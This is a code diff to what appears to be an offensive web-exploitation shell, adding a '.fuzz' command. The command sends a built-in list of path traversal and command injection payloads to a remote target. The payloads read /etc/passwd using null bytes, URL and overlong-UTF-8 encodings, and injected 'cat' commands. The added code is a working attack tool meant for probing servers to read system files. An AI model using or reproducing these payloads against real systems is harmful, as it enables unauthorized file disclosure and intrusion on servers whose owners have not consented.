@@ -30,6 +30,45 @@ def payload_php():
   return
 
 
+def payload_fuzzfile():
+  ## root:.:0:0:.*:.*:.+
+  if cfg.fuzzfile == 'default':
+    payload = [r"../../../../../../../../../etc/passwd",
+      r"../../../../../../../../etc/passwd",
+      r"../../../../../../../etc/passwd",
+      r"../../../../../../etc/passwd",
+      r"../../../../../etc/passwd",
+      r"../../../../etc/passwd",
+      r"../../../etc/passwd",
+      r"../../../../../../../../../../../../etc/passwd%00",
+      r"../../../../../../../../../../../../etc/passwd",
+      r"/../../../../../../../../../../etc/passwd^^",
+      r"/../../../../../../../../../../etc/passwd",
+      r"/./././././././././././etc/passwd",
+      r"\..\..\..\..\..\..\..\..\..\..c\passwd",
+      r"..\..\..\..\..\..\..\..\..\..c\passwd",
+      r"/..\../..\../..\../..\../..\../..\../etc/passwd",
+      r".\./.\./.\./.\./.\./.\./etc/passwd",
+      r"\..\..\..\..\..\..\..\..\..\..c\passwd%00",
+      r"..\..\..\..\..\..\..\..\..\..c\passwd%00",
+      r"%0a/bin/cat%20/etc/passwd",
+      r"%00/etc/passwd%00",
+      r"%00../../../../../../etc/passwd",
+      r"/../../../../../../../../../../../etc/passwd%00.jpg",
+      r"/../../../../../../../../../../../etc/passwd%00.html",
+      r"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
+      r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+      r"\&apos;/bin/cat%20/etc/passwd\&apos;"
+    ]
+  else:
+    payload = []
+    with open(cfg.fuzzfile, 'r') as file:
+      payloads = file.readlines()
+      for p in payloads:
+        payload.append(p)
+  return payload
+
+
 ############################################################
 ## Functions
 
@@ -265,6 +304,24 @@ def cmd_find(cmd):
     sys.stderr.write("[!] Invalid parameters\n")
     return
   state.exec_cmd = True
+  return
+
+
+def cmd_fuzz(cmd):
+  ## set files to send to remote target
+  if len(cmd) == 1:
+    sys.stdout.write("[*] Fuzz file: %s\n" % (cfg.fuzzfile))
+    return
+  if cmd[1] == "start":
+    sys.stderr.write("[*] Starting fuzzer...\n")
+    state.exec_cmd = True
+    for payload in payload_fuzzfile():
+      state.userinput = payload
+      sys.stdout.write("[*] payload: %s\n" % (payload))
+      send_payload()
+    state.exec_cmd = False
+  else:
+    cfg.fuzzfile = cmd[1]
   return
 
 
@@ -687,6 +744,16 @@ command_list = {
       ".find setgid - search for setgid files.\n",
     ],
   },
+  "fuzz": {
+    "func": cmd_fuzz,
+    "description": "",
+    "help_text": [
+      ".fuzz - show source for fuzzing.\n",
+      ".fuzz start - start fuzzing.\n",
+      ".fuzz @<file> - use file as source for fuzzing.\n",
+      "                type 'default' to use bult-in source.\n",
+    ],
+  },
   "headers": {
     "func": cmd_headers,
     "description": "",
@@ -732,7 +799,7 @@ command_list = {
     "help_text": [
       ".marker              - show the current payload output marker.\n",
       ".marker set <string> - set the payload output marker to string.\n",
-      ".marker out <number> - the output indices to display after splitting on",
+      ".marker out <number> - the output indices to display after splitting on\n",
       "                       our marker.\n",
     ],
   },
